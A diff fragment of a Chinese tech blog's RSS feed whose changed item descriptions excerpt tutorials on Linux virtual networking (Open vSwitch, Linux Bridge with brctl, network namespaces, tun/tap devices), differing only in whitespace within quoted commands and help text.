-# 添加网桥 ovs-vsctl add-br br-int # 添加三个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type=internal # 添加三个netns ip netns add ns0 ip netns add ns1 ip netns add ns2 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 ip link set vnet2 netns ns2 # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.</description>
+# 添加网桥 ovs-vsctl add-br br-int # 添加三个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type=internal # 添加三个netns ip netns add ns0 ip netns add ns1 ip netns add ns2 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 ip link set vnet2 netns ns2  # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.</description>
     </item>
     
     <item>
@@ -416,7 +430,7 @@ vctl system stop 接下来就是和普通的docker命令一样了。
 Linux Bridge通常是搭配KVM、docker等虚拟化技术一起使用的，用于构建虚拟网络，因为此教程不涉及虚拟化技术，我们就使用前面学习过的netns来模拟虚拟设备。
 如何使用Linux Bridge？ 操作网桥有多种方式，在这里我们介绍一下通过bridge-utils来操作，由于它不是Linux系统自带的工具，因此需要我们手动来安装它。
 # centos yum install -y bridge-utils # ubuntu apt-get install -y bridge-utils 使用brctl help查看使用帮助
-never heard of command [help] Usage: brctl [commands] commands: addbr &amp;lt;bridge&amp;gt;	add bridge delbr &amp;lt;bridge&amp;gt;	delete bridge addif &amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	add interface to bridge delif &amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	delete interface from bridge hairpin &amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; {on|off}	turn hairpin on/off setageing &amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;	set ageing time setbridgeprio	&amp;lt;bridge&amp;gt; &amp;lt;prio&amp;gt;	set bridge priority setfd &amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;	set bridge forward delay sethello &amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;	set hello time setmaxage &amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;	set max message age setpathcost	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;cost&amp;gt;	set path cost setportprio	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;prio&amp;gt;	set port priority show [ &amp;lt;bridge&amp;gt; ]	show a list of bridges showmacs &amp;lt;bridge&amp;gt;	show a list of mac addrs showstp &amp;lt;bridge&amp;gt;	show bridge stp info stp &amp;lt;bridge&amp;gt; {on|off}	turn stp on/off 常用命令如</description>
+never heard of command [help] Usage: brctl [commands] commands: 	addbr &amp;lt;bridge&amp;gt;	add bridge 	delbr &amp;lt;bridge&amp;gt;	delete bridge 	addif &amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	add interface to bridge 	delif &amp;lt;bridge&amp;gt; &amp;lt;device&amp;gt;	delete interface from bridge 	hairpin &amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; {on|off}	turn hairpin on/off 	setageing &amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;	set ageing time 	setbridgeprio	&amp;lt;bridge&amp;gt; &amp;lt;prio&amp;gt;	set bridge priority 	setfd &amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;	set bridge forward delay 	sethello &amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;	set hello time 	setmaxage &amp;lt;bridge&amp;gt; &amp;lt;time&amp;gt;	set max message age 	setpathcost	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;cost&amp;gt;	set path cost 	setportprio	&amp;lt;bridge&amp;gt; &amp;lt;port&amp;gt; &amp;lt;prio&amp;gt;	set port priority 	show [ &amp;lt;bridge&amp;gt; ]	show a list of bridges 	showmacs &amp;lt;bridge&amp;gt;	show a list of mac addrs 	showstp &amp;lt;bridge&amp;gt;	show bridge stp info 	stp &amp;lt;bridge&amp;gt; {on|off}	turn stp on/off 常用命令如</description>
     </item>
     
     <item>
@@ -441,7 +455,7 @@ ip link add &amp;lt;veth name&amp;gt; type veth peer name &amp;lt;peer name&amp;
       <guid>https://typesafe.cn/posts/linux-netns/</guid>
       <description>Network Namespace （以下简称netns）是Linux内核提供的一项实现网络隔离的功能，它能隔离多个不同的网络空间，并且各自拥有独立的网络协议栈，这其中便包括了网络接口（网卡），路由表，iptables规则等。例如大名鼎鼎的docker便是基于netns实现的网络隔离，今天我们就来手动实验一下netns的隔离特性。
 使用方式 使用ip netns help查看使用帮助
-Usage: ip netns list ip netns add NAME ip netns set NAME NETNSID ip [-all] netns delete [NAME] ip netns identify [PID] ip netns pids NAME ip [-all] netns exec [NAME] cmd ... ip netns monitor ip netns list-id 开始实验 我们将要构建如下图的网络
+Usage: ip netns list  ip netns add NAME  ip netns set NAME NETNSID  ip [-all] netns delete [NAME]  ip netns identify [PID]  ip netns pids NAME  ip [-all] netns exec [NAME] cmd ...  ip netns monitor  ip netns list-id 开始实验 我们将要构建如下图的网络
 首先我们添加两个tap设备并配置上IP信息，然后添加两个netns，最后将tap设备移动到netns中
 # 添加并启动虚拟网卡tap设备 ip tuntap add dev tap0 mode tap ip tuntap add dev tap1 mode tap ip link set tap0 up ip link set tap1 up # 配置IP ip addr add 10.</description>
     </item>
@@ -465,7 +479,7 @@ tun是三层网络设备，收发的是IP层数据包，无法处理以太网数
 tap是二层网络设备，收发以太网数据帧，拥有MAC层的功能，可以和物理网卡通过网桥相连，组成一个二层网络。例如OpenVPN的桥接模式可以从外部打一条隧道到本地网络。进来的机器就像本地的机器一样参与通讯，丝毫看不出这些机器是在远程。如果你有使用过虚拟机的经验，桥接模式也是一种十分常见的网络方案，虚拟机会分配到和宿主机器同网段的IP，其他同网段的机器也可以通过网络访问到这台虚拟机。
 使用方式 Linux 提供了一些命令行程序方便我们来创建持久化的tun/tap设备，但是如果没有应用程序打开对应的文件描述符，tun/tap的状态一直会是DOWN，还好的是这并不会影响我们把它当作普通网卡去使用。
 使用ip tuntap help查看使用帮助
-Usage: ip tuntap { add | del | show | list | lst | help } [ dev PHYS_DEV ] [ mode { tun | tap } ] [ user USER ] [ group GROUP ] [ one_queue ] [ pi ] [ vnet_hdr ] [ multi_queue ] [ name NAME ] Where:	USER := { STRING | NUMBER } GROUP := { STRING | NUMBER } 示例 # 创建 tap  ip tuntap add dev tap0 mode tap # 创建 tun ip tuntap add dev tun0 mode tun # 删除 tap ip tuntap del dev tap0 mode tap # 删除 tun ip tuntap del dev tun0 mode tun tun/tap 设备创建成功后可以当作普通的网卡一样使用，因此我们也可以通过ip link命令来操作它。</description>
+Usage: ip tuntap { add | del | show | list | lst | help } [ dev PHYS_DEV ] 	[ mode { tun | tap } ] [ user USER ] [ group GROUP ] 	[ one_queue ] [ pi ] [ vnet_hdr ] [ multi_queue ] [ name NAME ]  Where:	USER := { STRING | NUMBER } 	GROUP := { STRING | NUMBER } 示例 # 创建 tap  ip tuntap add dev tap0 mode tap # 创建 tun ip tuntap add dev tun0 mode tun  # 删除 tap ip tuntap del dev tap0 mode tap # 删除 tun ip tuntap del dev tun0 mode tun tun/tap 设备创建成功后可以当作普通的网卡一样使用，因此我们也可以通过ip link命令来操作它。</description>
     </item>
     
     <item>
